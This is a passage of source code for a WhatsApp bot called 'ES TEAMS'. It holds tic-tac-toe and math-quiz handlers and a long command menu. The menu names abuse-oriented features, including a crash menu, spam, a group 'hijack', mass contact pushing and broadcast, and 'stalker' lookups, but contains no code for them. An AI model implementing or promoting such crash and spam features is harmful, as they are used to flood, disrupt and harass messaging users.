        replygcxlicon('𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐢𝐬 𝐖𝐚𝐢𝐭𝐢𝐧𝐠 𝐟𝐨𝐫 𝐭𝐡𝐞 𝐒𝐞𝐜𝐨𝐧𝐝 𝐏𝐥𝐚𝐲𝐞𝐫\n\nType *.ttt-join* to join the game and play!\n\n(If no second player joins within 5 minutes, the game will be closed.)');

        game.tictactoe[room.id] = room;
    }
}
break;

case 'ttt-join': {
    const reply = (message) => XliconBotInc.sendMessage(m.chat, { text: message }, { quoted: m });
    let room = Object.values(game.tictactoe).find(room => room.state === 'WAITING' && room.o === ''); // Find the waiting room with no second player

    if (!room) {
        return replygcxlicon('No game is waiting for a second player at the moment. Please try again later.');
    }

    // Add the player as the second player
    room.o = m.chat;
    room.game.playerO = m.sender;
    room.state = 'PLAYING';

    let arr = room.game.render().map(v => {
        return { X: '❌', O: '⭕', 1: '1️⃣', 2: '2️⃣', 3: '3️⃣', 4: '4️⃣', 5: '5️⃣', 6: '6️⃣', 7: '7️⃣', 8: '8️⃣', 9: '9️⃣' }[v];
    });

    let str = `𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐗 𝐀𝐍𝐃 𝐎\n\nRoom ID: ${room.id}\n\n${arr.slice(0, 3).join('')}\n${arr.slice(3, 6).join('')}\n${arr.slice(6).join('')}\n\nWaiting @${room.game.currentTurn.split('@')[0]}\n\nType *surrender* to give up and admit defeat\n\nPowered by 𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐓𝐄𝐂𝐇`;

    if (room.x !== room.o) {
        await XliconBotInc.sendMessage(room.x, { text: str, mentions: parseMention(str) }, { quoted: m });
    }
    await XliconBotInc.sendMessage(room.o, { text: str, mentions: parseMention(str) }, { quoted: m });

    // Send to global channel
    await XliconBotInc.sendMessage(global.wagc, { text: str, mentions: parseMention(str) });
}
break;

			case 'mathquiz': case 'math': {
				const { genMath, modes } = require('./lib/math');
const axios = require('axios');
				const inputMode = ['noob', 'easy', 'medium', 'hard','extreme','impossible','impossible2'];
				if (!text) return replygcxlicon(`Mode: ${Object.keys(modes).join(' | ')}\nContoh penggunaan: ${prefix}math medium`)
				if (!inputMode.includes(text.toLowerCase())) return replygcxlicon('Mode not found!')
				if (game.kuismath.hasOwnProperty(m.sender.split('@')[0])) return replygcxlicon('There Are Still Unfinished Sessions!')
				let result = await genMath(text.toLowerCase())
				replygcxlicon(`*Berapa hasil dari: ${result.soal.toLowerCase()}*?\n\nTime: ${(result.waktu / 1000).toFixed(2)} detik`).then(() => {
					game.kuismath[m.sender.split('@')[0]] = {
						jawaban: result.jawaban,
						mode: text.toLowerCase()
					}
				})
				await sleep(result.waktu)
				if (game.kuismath.hasOwnProperty(m.sender.split('@')[0])) {
					replygcxlicon('Time has run out\nAnswer: ' + game.kuismath[m.sender.split('@')[0]].jawaban)
					delete game.kuismath[m.sender.split('@')[0]]
				}
			}
			break


//ALL MENUS CODES START FROM HERE      
			
			// Menu
		    case 'esteams': {
    try {
        await XliconBotInc.sendMessage(m.chat, { react: { text: "❄️", key: m.key } });

        const timestampe = speed();
        const latensie = speed() - timestampe;
        const me = m.sender;

        // Define menu content
        let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Number : +${me.split('@')[0]}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐌𝐄𝐍𝐔\` 】❄️━━━━━╮
┃ ${setv} ${prefix}allmenu
┃ ${setv} ${prefix}esteamsnew-menu
┃ ${setv} ${prefix}searchmenu
┃ ${setv} ${prefix}downloadmenu
┃ ${setv} ${prefix}gamemenu
┃ ${setv} ${prefix}funmenu
┃ ${setv} ${prefix}aimenu
┃ ${setv} ${prefix}groupmenu
┃ ${setv} ${prefix}nsfwmenu
┃ ${setv} ${prefix}ownermenu
┃ ${setv} ${prefix}convertmenu
┃ ${setv} ${prefix}crashmenu
┃ ${setv} ${prefix}banmenu
┃ ${setv} ${prefix}listmenu
┃ ${setv} ${prefix}religionmenu
┃ ${setv} ${prefix}animemenu
┃ ${setv} ${prefix}randomphotomenu
┃ ${setv} ${prefix}randomvideomenu
┃ ${setv} ${prefix}stickermenu
┃ ${setv} ${prefix}databasemenu
┃ ${setv} ${prefix}storemenu
┃ ${setv} ${prefix}stalkermenu
┃ ${setv} ${prefix}othermenu
╰━━━━━━━━━━━━━━━━━━━━━╯`;

        // Send the menu with a large bot picture
        let viewChannelLink = global.wagc; // Global channel link
        let msg = generateWAMessageFromContent(m.chat, {
            extendedTextMessage: {
                text: xmenu_oh,
                footer: `Powered by ❄️𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏❄️`,
                contextInfo: {
                    externalAdReply: {
                        title: "❄️𝙀𝙎 𝙏𝙀𝘼𝙈𝙎 𝙈𝙀𝙉𝙐❄️", // Menu Title
                        body: "For more info, visit the channel.",
                        showAdAttribution: true,
                        mediaType: 1,
                        thumbnail: fs.readFileSync('./ES_TEAMS-MEDIA/theme/ES_TEAMS.jpg'), // Large Bot Picture
                        sourceUrl: viewChannelLink, // Clickable channel link
                    },
                    mentionedJid: [m.sender],
                },
            },
        }, {});
        await XliconBotInc.relayMessage(msg.key.remoteJid, msg.message, {
            messageId: msg.key.id,
        });

        // Send the audio as a voice note after the menu
        const darkphonk = fs.readFileSync('./lib/ES_TEAMS.mp3');
        await XliconBotInc.sendMessage(m.chat, {
            audio: darkphonk,
            mimetype: 'audio/mp4',
            ptt: true, // Sends as voice note
        }, { quoted: m });

    } catch (error) {
        console.error(error);
        await XliconBotInc.sendMessage(m.chat, {
            text: "❌ An error occurred while generating the menu. Please try again later.",
        }, { quoted: m });
    }
}
break;

break
case 'allmenu': {
let xmenu_oh = `
╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐕𝟏\` 】❄️━━━━━╮
┃ ❁️ Runtime : ${runtime(process.uptime())}
┃ ❁️ Host : ${os.hostname()}
┃ ❁️ Platform : ${os.platform()}
┃ ❁️ Bot Name : ${global.botname}
┃ ❁️ Owner : @${ownernumber[0].split('@')[0]}
┃ ❁️ Mode : ${XliconBotInc.public ? 'Public' : 'Self'}
┃ ❁️ Total Users : ${Object.keys(global.db.users).length}
┃ ❁️ Total Hits : ${global.db.settings[botNumber].totalhit}
┃ ❁️ Total Chats : ${Object.keys(global.db.groups).length}
┃ ❁️ Prefix :「 ${xprefix} 」
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐔𝐒𝐄𝐑 𝐈𝐍𝐅𝐎\` 】❄️━━━━━╮
┃ ❁️ Name : ${m.pushName ? m.pushName : 'No name'}
┃ ❁️ Id : @${m.sender.split('@')[0]}
┃ ❁️ User : ${isVip ? 'VIP' : isPremium ? 'PREMIUM' : 'FREE'}
┃ ❁️ Limit : ${isVip ? 'Unlimited' : global.db.users[m.sender].limit}
┃ ❁️ Money : ${global.db.users[m.sender] ? global.db.users[m.sender].uang.toLocaleString('en-IN') : '0'}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐈𝐌𝐄\` 】❄️━━━━━╮
┃ ❁️ Date : ${xdate}
┃ ❁️ Day : ${xday}
┃ ❁️ Time : ${xtime}
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐎𝐖𝐍𝐄𝐑\` 】❄️━━━━━╮
┃ ${setv} ${prefix}addbadword 🅞
┃ ${setv} ${prefix}delbadword 🅞
┃ ${setv} ${prefix}autoread 🅞
┃ ${setv} ${prefix}esteams-update 🅞
┃ ${setv} ${prefix}esteamsnew-menu 🅞
┃ ${setv} ${prefix}autobio 🅞
┃ ${setv} ${prefix}databasemenu 🅞
┃ ${setv} ${prefix}autotype 🅞
┃ ${setv} ${prefix}set-payment 🅞
┃ ${setv} ${prefix}esteams-payment 🅞
┃ ${setv} ${prefix}unavailable 🅞
┃ ${setv} ${prefix}autorecord 🅞
┃ ${setv} ${prefix}autorecordtype 🅞
┃ ${setv} ${prefix}autoswview 🅞
┃ ${setv} ${prefix}setautoblock 🅞
┃ ${setv} ${prefix}setantiforeign 🅞
┃ ${setv} ${prefix}autoblock 🅞
┃ ${setv} ${prefix}onlygc 🅞
┃ ${setv} ${prefix}onlypc 🅞
┃ ${setv} ${prefix}onlyindia 🅞
┃ ${setv} ${prefix}onlyindo 🅞
┃ ${setv} ${prefix}anticall 🅞
┃ ${setv} ${prefix}self 🅞
┃ ${setv} ${prefix}public 🅞
┃ ${setv} ${prefix}join 🅞
┃ ${setv} ${prefix}poll 🅞
┃ ${setv} ${prefix}spam 🅞
┃ ${setv} ${prefix}bc 🅞
┃ ${setv} ${prefix}bcgroup 🅞
┃ ${setv} ${prefix}setmenu 🅞
┃ ${setv} ${prefix}setimgmenu 🅞
┃ ${setv} ${prefix}setvidmenu 🅞
┃ ${setv} ${prefix}setgifmenu 🅞
┃ ${setv} ${prefix}setreply 🅞
┃ ${setv} ${prefix}resethit 🅞
┃ ${setv} ${prefix}resetuser 🅞
┃ ${setv} ${prefix}creategc 🅞
┃ ${setv} ${prefix}setexif 🅞
┃ ${setv} ${prefix}getexif 🅞
┃ ${setv} ${prefix}getautoblocknumber 🅞
┃ ${setv} ${prefix}getantiforeignnumber 🅞
┃ ${setv} ${prefix}userjid 🅞
┃ ${setv} ${prefix}setbotbio 🅞
┃ ${setv} ${prefix}delppbot 🅞
┃ ${setv} ${prefix}shutdown 🅞
┃ ${setv} ${prefix}setppbot 🅞
┃ ${setv} ${prefix}addprem 🅞
┃ ${setv} ${prefix}delprem 🅞
┃ ${setv} ${prefix}addowner 🅞
┃ ${setv} ${prefix}delowner 🅞
┃ ${setv} ${prefix}addvn 🅞
┃ ${setv} ${prefix}addapk 🅞
┃ ${setv} ${prefix}addzip 🅞
┃ ${setv} ${prefix}addpdf 🅞
┃ ${setv} ${prefix}delapk 🅞
┃ ${setv} ${prefix}delzip 🅞
┃ ${setv} ${prefix}delpdf 🅞
┃ ${setv} ${prefix}delvn 🅞
┃ ${setv} ${prefix}addsticker 🅞
┃ ${setv} ${prefix}delsticker 🅞
┃ ${setv} ${prefix}addimage 🅞
┃ ${setv} ${prefix}delimage 🅞
┃ ${setv} ${prefix}addvideo 🅞
┃ ${setv} ${prefix}delvideo 🅞
┃ ${setv} ${prefix}upswtext 🅞
┃ ${setv} ${prefix}upswvideo 🅞
┃ ${setv} ${prefix}upswimage 🅞
┃ ${setv} ${prefix}upswaudio 🅞
┃ ${setv} ${prefix}autosticker 🅞
┃ ${setv} ${prefix}block 🅞
┃ ${setv} ${prefix}unblock 🅞
┃ ${setv} ${prefix}leavegc 🅞
┃ ${setv} ${prefix}pushcontact 🅞
┃ ${setv} ${prefix}pushcontactv2 🅞
┃ ${setv} ${prefix}pushcontactv3 🅞
┃ ${setv} ${prefix}jpm 🅞
┃ ${setv} ${prefix}checkmember 🅞
┃ ${setv} ${prefix}post 🅞
┃ ${setv} ${prefix}clearchat 🅞
┃ ${setv} ${prefix}setprefix 🅞
┃ ${setv} $ 🅞
┃ ${setv} > 🅞
┃ ${setv} < 🅞
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐄𝐒 𝐓𝐄𝐀𝐌𝐒 𝐌𝐄𝐍𝐔\` 】❄️━━━━━╮
┃ ${setv} ${prefix}esteams-lock 🅞
┃ ${setv} ${prefix}esteams-unlock 🅞
┃ ${setv} ${prefix}esteams-reset 🅞
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐆𝐑𝐎𝐔𝐏\` 】❄️━━━━━╮
┃ ${setv} ${prefix}antibot 🅖
┃ ${setv} ${prefix}antiviewonce 🅖
┃ ${setv} ${prefix}esteams-broadcast 🅞
┃ ${setv} ${prefix}readviewonce 🅖
┃ ${setv} ${prefix}esteams-hijack 🅞
┃ ${setv} ${prefix}welcome 🅖
┃ ${setv} ${prefix}whois 🅞
┃ ${setv} ${prefix}adminevent 🅖
┃ ${setv} ${prefix}groupevent 🅖
┃ ${setv} ${prefix}antiforeign 🅖
┃ ${setv} ${prefix}antimedia 🅖
┃ ${setv} ${prefix}antiaudio 🅖
┃ ${setv} ${prefix}antivideo 🅖
┃ ${setv} ${prefix}antiimage 🅖
┃ ${setv} ${prefix}antidocument 🅖
┃ ${setv} ${prefix}antilocation 🅖
┃ ${setv} ${prefix}anticontact 🅖
┃ ${setv} ${prefix}antisticker 🅖
┃ ${setv} ${prefix}antipoll 🅖
┃ ${setv} ${prefix}antilink 🅖
┃ ${setv} ${prefix}antiemoji 🅖
┃ ${setv} ${prefix}antipromotion 🅖
┃ ${setv} ${prefix}antivirtex 🅖
┃ ${setv} ${prefix}grouplink 🅖
┃ ${setv} ${prefix}listadmin 🅖
┃ ${setv} ${prefix}invite 🅖
┃ ${setv} ${prefix}ephemeral 🅖
┃ ${setv} ${prefix}delete 🅖
┃ ${setv} ${prefix}setppgroup 🅖
┃ ${setv} ${prefix}delppgroup 🅖
┃ ${setv} ${prefix}setnamegc 🅖
┃ ${setv} ${prefix}setdesc 🅖
┃ ${setv} ${prefix}add 🅖
┃ ${setv} ${prefix}kick 🅖
┃ ${setv} ${prefix}promote 🅖
┃ ${setv} ${prefix}demote 🅖
┃ ${setv} ${prefix}kickall 🅖
┃ ${setv} ${prefix}promoteall 🅖
┃ ${setv} ${prefix}demoteall 🅖
┃ ${setv} ${prefix}getcontact 🅞
┃ ${setv} ${prefix}savecontact 🅞
┃ ${setv} ${prefix}sendcontact 🅞
┃ ${setv} ${prefix}contactag 🅞
┃ ${setv} ${prefix}hidetag 🅖
┃ ${setv} ${prefix}totag 🅖
┃ ${setv} ${prefix}tagall 🅖
┃ ${setv} ${prefix}editinfo 🅖
┃ ${setv} ${prefix}opentime 🅖
┃ ${setv} ${prefix}closetime 🅖
┃ ${setv} ${prefix}resetlink 🅖
┃ ${setv} ${prefix}getbio 🅖
┃ ${setv} ${prefix}vote 🅖
┃ ${setv} ${prefix}upvote 🅖
┃ ${setv} ${prefix}downvote 🅖
┃ ${setv} ${prefix}checkvote 🅖
┃ ${setv} ${prefix}delvote 🅖
┃ ${setv} ${prefix}antivirus 🅖
┃ ${setv} ${prefix}antibadword 🅖
┃ ${setv} ${prefix}nsfw 🅖
┃ ${setv} ${prefix}react 🅖
┃ ${setv} ${prefix}getjoinrequest 🅖
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐒𝐄𝐀𝐑𝐂𝐇\` 】❄️━━━━━╮
┃ ${setv} ${prefix}google 🅕
┃ ${setv} ${prefix}wikipedia 🅕
┃ ${setv} ${prefix}ytsearch 🅕
┃ ${setv} ${prefix}esteams-search 🅞
┃ ${setv} ${prefix}apksearch 🅕
┃ ${setv} ${prefix}esteams-movie 🅞
┃ ${setv} ${prefix}stickersearch 🅕
┃ ${setv} ${prefix}imdb 🅕
┃ ${setv} ${prefix}wanumber 🅕
┃ ${setv} ${prefix}friend 🅕
┃ ${setv} ${prefix}lyrics 🅕
┃ ${setv} ${prefix}pixiv 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐃𝐎𝐖𝐍𝐋𝐎𝐀𝐃\` 】❄️━━━━━╮
┃ ${setv} ${prefix}itunes 🅕
┃ ${setv} ${prefix}play 🅕
┃ ${setv} ${prefix}ytmp3 🅕
┃ ${setv} ${prefix}ytmp4 🅕
┃ ${setv} ${prefix}yta 🅕
┃ ${setv} ${prefix}ytv 🅕
┃ ${setv} ${prefix}yta2 🅕
┃ ${setv} ${prefix}ytv2 🅕
┃ ${setv} ${prefix}image 🅕
┃ ${setv} ${prefix}gimage 🅕
┃ ${setv} ${prefix}live-wallpaper 🅕
┃ ${setv} ${prefix}tiktok 🅕
┃ ${setv} ${prefix}tiktokaudio 🅕
┃ ${setv} ${prefix}tiktokvideo 🅕
┃ ${setv} ${prefix}instagram 🅕
┃ ${setv} ${prefix}igimg 🅕
┃ ${setv} ${prefix}facebook 🅕
┃ ${setv} ${prefix}twitter 🅕
┃ ${setv} ${prefix}apk 🅕
┃ ${setv} ${prefix}modwa 🅕
┃ ${setv} ${prefix}bilibili 🅕
┃ ${setv} ${prefix}dailymotion 🅕
┃ ${setv} ${prefix}mega 🅕
┃ ${setv} ${prefix}mediafire 🅕
┃ ${setv} ${prefix}searchsoundcloud 🅕
┃ ${setv} ${prefix}soundcloud 🅕
┃ ${setv} ${prefix}google 🅕
┃ ${setv} ${prefix}gimage 🅕
┃ ${setv} ${prefix}weather 🅕
┃ ${setv} ${prefix} 🅟
┃ ${setv} ${prefix}gitclone 🅕
┃ ${setv} ${prefix}happymod 🅕
┃ ${setv} ${prefix}gdrive 🅕
┃ ${setv} ${prefix}pinterest 🅕
┃ ${setv} ${prefix}ringtone 🅕
┃ ${setv} ${prefix}autodownload 🅞
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔\` 】❄️━━━━━╮
┃ ${setv} ${prefix}obfuscate 🅕
┃ ${setv} ${prefix}styletext 🅕
┃ ${setv} ${prefix}fliptext 🅕

┃ ${setv} ${prefix}tts 🅕
┃ ${setv} ${prefix}say 🅕
┃ ${setv} ${prefix}togif 🅕
┃ ${setv} ${prefix}toqr 🅕
┃ ${setv} ${prefix}bass 🅕
┃ ${setv} ${prefix}blown 🅕
┃ ${setv} ${prefix}deep 🅕
┃ ${setv} ${prefix}earrape 🅕
┃ ${setv} ${prefix}fast 🅕
┃ ${setv} ${prefix}fat 🅕
┃ ${setv} ${prefix}nightcore 🅕
┃ ${setv} ${prefix}esteams-personality 🅞
┃ ${setv} ${prefix}reverse 🅕
┃ ${setv} ${prefix}robot 🅕
┃ ${setv} ${prefix}slow 🅕
┃ ${setv} ${prefix}smooth 🅕
┃ ${setv} ${prefix}squirrel 🅕
┃ ${setv} ${prefix}tinyurl 🅕
┃ ${setv} ${prefix}tovn 🅕
┃ ${setv} ${prefix}t 🅕
┃ ${setv} ${prefix}toaudio 🅕
┃ ${setv} ${prefix}tomp3 🅕
┃ ${setv} ${prefix}tomp4🅕
┃ ${setv} ${prefix}toimg 🅕
┃ ${setv} ${prefix}toonce 🅕
┃ ${setv} ${prefix}toptv 🅕
┃ ${setv} ${prefix}sticker 🅕
┃ ${setv} ${prefix}smeme 🅕
┃ ${setv} ${prefix}smeta 🅕
┃ ${setv} ${prefix}take 🅟
┃ ${setv} ${prefix}emojimix 🅕
┃ ${setv} ${prefix}volaudio 🅕
┃ ${setv} ${prefix}volvideo 🅕
┃ ${setv} ${prefix}ebinary 🅕
┃ ${setv} ${prefix}dbinary 🅕
┃ ${setv} ${prefix}ssweb 🅕
┃ ${setv} ${prefix}quoted 🅕
┃ ${setv} ${prefix}translate 🅕
┃ ${setv} ${prefix}get 🅕
┃ ${setv} ${prefix}tourl 🅕
┃ ${setv} ${prefix}write 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐋𝐈𝐒𝐓 𝐌𝐄𝐍𝐔\` 】❄️━━━━━╮
┃ ${setv} ${prefix}listprem 🅕
┃ ${setv} ${prefix}listowner 🅕
┃ ${setv} ${prefix}liststicker 🅕
┃ ${setv} ${prefix}listimage 🅕
┃ ${setv} ${prefix}listvideo 🅕
┃ ${setv} ${prefix}listvn 🅕
┃ ${setv} ${prefix}listapk 🅕
┃ ${setv} ${prefix}listzip 🅕
┃ ${setv} ${prefix}listpdf 🅕
┃ ${setv} ${prefix}listbadword 🅕
┃ ${setv} ${prefix}listpc 🅕
┃ ${setv} ${prefix}listgc 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐑𝐀𝐍𝐃𝐎𝐌 𝐏𝐇𝐎𝐓𝐎\` 】❄️━━━━━╮
┃ ${setv} ${prefix}aesthetic 🅕
┃ ${setv} ${prefix}coffee 🅕
┃ ${setv} ${prefix}wikimedia 🅕
┃ ${setv} ${prefix}wallpaper 🅕
┃ ${setv} ${prefix}art 🅕
┃ ${setv} ${prefix}bts 🅕
┃ ${setv} ${prefix}dogwoof 🅕
┃ ${setv} ${prefix}catmeow 🅕
┃ ${setv} ${prefix}lizardpic 🅕
┃ ${setv} ${prefix}goosebird 🅕
┃ ${setv} ${prefix}8ballpool 🅕
┃ ${setv} ${prefix}cosplay 🅕
┃ ${setv} ${prefix}hacker 🅕
┃ ${setv} ${prefix}cyber 🅕
┃ ${setv} ${prefix}gamewallpaper 🅕
┃ ${setv} ${prefix}islamic 🅕
┃ ${setv} ${prefix}jennie 🅕
┃ ${setv} ${prefix}jiso 🅕
┃ ${setv} ${prefix}satanic 🅕
┃ ${setv} ${prefix}justina 🅕
┃ ${setv} ${prefix}cartoon 🅕
┃ ${setv} ${prefix}pentol 🅕
┃ ${setv} ${prefix}cat 🅕
┃ ${setv} ${prefix}kpop 🅕
┃ ${setv} ${prefix}exo 🅕
┃ ${setv} ${prefix}lisa 🅕
┃ ${setv} ${prefix}space 🅕
┃ ${setv} ${prefix}car 🅕
┃ ${setv} ${prefix}technology 🅕
┃ ${setv} ${prefix}bike 🅕
┃ ${setv} ${prefix}shortquote 🅕
┃ ${setv} ${prefix}antiwork 🅕
┃ ${setv} ${prefix}hacking 🅕
┃ ${setv} ${prefix}boneka 🅕
┃ ${setv} ${prefix}rose 🅕
┃ ${setv} ${prefix}ryujin 🅕
┃ ${setv} ${prefix}ulzzangboy 🅕
┃ ${setv} ${prefix}ulzzanggirl 🅕
┃ ${setv} ${prefix}wallml 🅕
┃ ${setv} ${prefix}wallphone 🅕
┃ ${setv} ${prefix}mountain 🅕
┃ ${setv} ${prefix}goose 🅕
┃ ${setv} ${prefix}profilepic 🅕
┃ ${setv} ${prefix}couplepp 🅕
┃ ${setv} ${prefix}programming 🅕
┃ ${setv} ${prefix}pubg 🅕
┃ ${setv} ${prefix}blackpink 🅕
┃ ${setv} ${prefix}randomboy 🅕  
┃ ${setv} ${prefix}randomgirl 🅕
┃ ${setv} ${prefix}hijab 🅕  
┃ ${setv} ${prefix}chinese 🅕
┃ ${setv} ${prefix}indo 🅕
┃ ${setv} ${prefix}japanese 🅕
┃ ${setv} ${prefix}korean 🅕
┃ ${setv} ${prefix}malay 🅕
┃ ${setv} ${prefix}thai 🅕
┃ ${setv} ${prefix}vietnamese 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐑𝐀𝐍𝐃𝐎𝐌 𝐕𝐈𝐃𝐄𝐎\` 】❄️━━━━━╮
┃ ${setv} ${prefix}tiktokgirl 🅕
┃ ${setv} ${prefix}tiktoknukthy 🅕
┃ ${setv} ${prefix}tiktokkayes 🅕
┃ ${setv} ${prefix}tiktokpanrika 🅕
┃ ${setv} ${prefix}tiktoknotnot 🅕
┃ ${setv} ${prefix}tiktokghea 🅕
┃ ${setv} ${prefix}tiktoksantuy 🅕
┃ ${setv} ${prefix}tiktokbocil 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐒𝐓𝐀𝐋𝐊𝐄𝐑\` 】❄️━━━━━╮
┃ ${setv} ${prefix}tiktokstalk 🅕
┃ ${setv} ${prefix}mlstalk 🅕
┃ ${setv} ${prefix}npmstalk 🅕
┃ ${setv} ${prefix}ghstalk 🅕
┃ ${setv} ${prefix}telestalk 🅕
┃ ${setv} ${prefix}wachannelstalk 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐎𝐏𝐄𝐍 𝐀𝐈\` 】❄️━━━━━╮
┃ ${setv} ${prefix} 🅕
┃ ${setv} ${prefix}travel-assistant 🅕
┃ ${setv} ${prefix}realistic 🅕
┃ ${setv} ${prefix}mangaimg 🅕
┃ ${setv} ${prefix}animeimg 🅕
┃ ${setv} ${prefix}lexica 🅕
┃ ${setv} ${prefix}chechkgpt 🅕
┃ ${setv} ${prefix}3dmodel 🅕
┃ ${setv} ${prefix}photoleap 🅕
┃ ${setv} ${prefix}chatgpt 🅕
┃ ${setv} ${prefix}darky 🅕
┃ ${setv} ${prefix}bing 🅕
┃ ${setv} ${prefix}mathsai 🅕
┃ ${setv} ${prefix}openai 🅕
┃ ${setv} ${prefix}dalle 🅕
┃ ${setv} ${prefix}stablediffusion 🅕
┃ ${setv} ${prefix}ai 🅕
┃ ${setv} ${prefix}remini 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐆𝐀𝐌𝐄\` 】❄️━━━━━╮
┃ ${setv} ${prefix}truth 🅕
┃ ${setv} ${prefix}dare 🅕
┃ ${setv} ${prefix}suit 🅕
┃ ${setv} ${prefix}tictactoe 🅕
┃ ${setv} ${prefix}math 🅕
┃ ${setv} ${prefix}playbomb 🅕
┃ ${setv} ${prefix}casino 🅕
┃ ${setv} ${prefix}rob 🅕
┃ ${setv} ${prefix}slot 🅕
┃ ${setv} ${prefix}dice 🅕
┃ ${setv} ${prefix}profile 🅕
┃ ${setv} ${prefix}claim 🅕
┃ ${setv} ${prefix}tmoney 🅕
┃ ${setv} ${prefix}tflimit 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐅𝐔𝐍\` 】❄️━━━━━╮
┃ ${setv} ${prefix}define 🅕
┃ ${setv} ${prefix}readmore 🅕
┃ ${setv} ${prefix}yomamajoke 🅕
┃ ${setv} ${prefix}fact 🅕
┃ ${setv} ${prefix}couple 🅕
┃ ${setv} ${prefix}soulmate 🅕
┃ ${setv} ${prefix}stupidcheck 🅕
┃ ${setv} ${prefix}handsomecheck 🅕
┃ ${setv} ${prefix}uncleancheck 🅕
┃ ${setv} ${prefix}hotcheck 🅕
┃ ${setv} ${prefix}smartcheck 🅕
┃ ${setv} ${prefix}greatcheck 🅕
┃ ${setv} ${prefix}evilcheck 🅕
┃ ${setv} ${prefix}dogcheck 🅕
┃ ${setv} ${prefix}coolcheck 🅕
┃ ${setv} ${prefix}waifucheck 🅕
┃ ${setv} ${prefix}awesomecheck 🅕
┃ ${setv} ${prefix}gaycheck 🅕
┃ ${setv} ${prefix}cutecheck 🅕
┃ ${setv} ${prefix}lesbiancheck 🅕
┃ ${setv} ${prefix}hornycheck 🅕
┃ ${setv} ${prefix}prettycheck 🅕
┃ ${setv} ${prefix}lovelycheck 🅕
┃ ${setv} ${prefix}uglycheck 🅕
┃ ${setv} ${prefix}pick 🅕
┃ ${setv} ${prefix}pickupline 🅕
┃ ${setv} ${prefix}quotes 🅕
┃ ${setv} ${prefix}can 🅕
┃ ${setv} ${prefix}is 🅕
┃ ${setv} ${prefix}when 🅕
┃ ${setv} ${prefix}where 🅕
┃ ${setv} ${prefix}what 🅕
┃ ${setv} ${prefix}how 🅕
┃ ${setv} ${prefix}rate 🅕
┃ ${setv} ${prefix}cry 🅕
┃ ${setv} ${prefix}kill 🅕
┃ ${setv} ${prefix}hug 🅕
┃ ${setv} ${prefix}pat 🅕
┃ ${setv} ${prefix}lick 🅕 
┃ ${setv} ${prefix}kiss 🅕
┃ ${setv} ${prefix}bite 🅕
┃ ${setv} ${prefix}yeet 🅕
┃ ${setv} ${prefix}bully 🅕
┃ ${setv} ${prefix}bonk 🅕
┃ ${setv} ${prefix}wink 🅕
┃ ${setv} ${prefix}poke 🅕
┃ ${setv} ${prefix}nom 🅕
┃ ${setv} ${prefix}slap 🅕
┃ ${setv} ${prefix}smile 🅕 
┃ ${setv} ${prefix}wave 🅕
┃ ${setv} ${prefix}awoo 🅕
┃ ${setv} ${prefix}blush 🅕
┃ ${setv} ${prefix}smug 🅕
┃ ${setv} ${prefix}glomp 🅕 
┃ ${setv} ${prefix}tictactoe 🅕
┃ ${setv} ${prefix}esteams-riddle 🅕
┃ ${setv} ${prefix}happy 🅕
┃ ${setv} ${prefix}dance 🅕
┃ ${setv} ${prefix}cringe 🅕
┃ ${setv} ${prefix}cuddle 🅕
┃ ${setv} ${prefix}highfive 🅕 
┃ ${setv} ${prefix}handhold 🅕
┃ ${setv} ${prefix}spank 🅕
┃ ${setv} ${prefix}tickle 🅕
┃ ${setv} ${prefix}feed 🅕
┃ ${setv} ${prefix}checkme 🅕
┃ ${setv} ${prefix}sound1 - sound161 🅕
╰━━━━━━━━━━━━━━━━━━━━━╯

╭━━━━━❄️【 \`𝐒𝐓𝐈𝐂𝐊𝐄𝐑\` 】❄️━━━━━╮
